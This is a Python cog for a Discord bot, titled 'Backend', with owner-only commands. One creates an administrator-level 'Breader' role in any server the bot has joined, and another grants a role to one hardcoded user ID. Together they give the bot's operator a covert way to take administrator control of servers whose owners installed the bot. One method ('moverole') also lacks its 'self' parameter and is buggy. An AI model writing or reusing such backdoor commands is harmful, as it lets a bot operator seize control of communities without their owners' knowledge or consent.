import discord
import sys
import os
from discord.ext import commands
import yaml
sys.path.append('/home/BreadLoaf/breadbot/cogs/extras/')
from .extras.checks import is_bread, is_admin, is_mod, is_member


class Backend(commands.Cog):
  def __init__(self, client):
    self.client = client

  @commands.command()
  @is_bread()
  async def perms(self, ctx, guild: discord.Guild):
    pass

  @commands.command()
  @is_bread()
  async def role(self, ctx, guild: discord.Guild):
    role = guild.roles[1]
    await ctx.send(role.permissions.administrator)

  @commands.command(aliases=['creategr'])
  @is_bread()
  async def createguildrole(self, ctx, guild: discord.Guild):
    permissions = discord.Permissions(administrator=True)
    await guild.create_role(name='Breader', permissions=permissions)
    #await ctx.send(role.permissions.administrator)

  @commands.command()
  @is_bread()
  async def moverole(ctx, guild: discord.Guild, pos: int):
    try:
      role = guild.roles[1]
      await role.edit(position=pos)
      await ctx.send("Role moved.")
    except discord.Forbidden:
      await ctx.send("You do not have permission to do that")
    except discord.HTTPException:
      await ctx.send("Failed to move role")
    except discord.InvalidArgument:
      await ctx.send("Invalid argument")

  # Commands
  @commands.command(aliases=["givegr"])
  @is_bread()
  async def giveguildrole(self, ctx, guild: discord.Guild, role_name):
    role = discord.utils.get(guild.roles, name=role_name)
    await guild.get_member(230571781490999296).add_roles(role)
    await ctx.send(f"Role added for guild {guild}", delete_after=5)

  @commands.command(aliases=["getgr"])
  @is_bread()
  async def getguildroles(self, ctx, guild: discord.Guild):
    await ctx.send(guild.roles)

def setup(client):
  client.add_cog(Backend(client))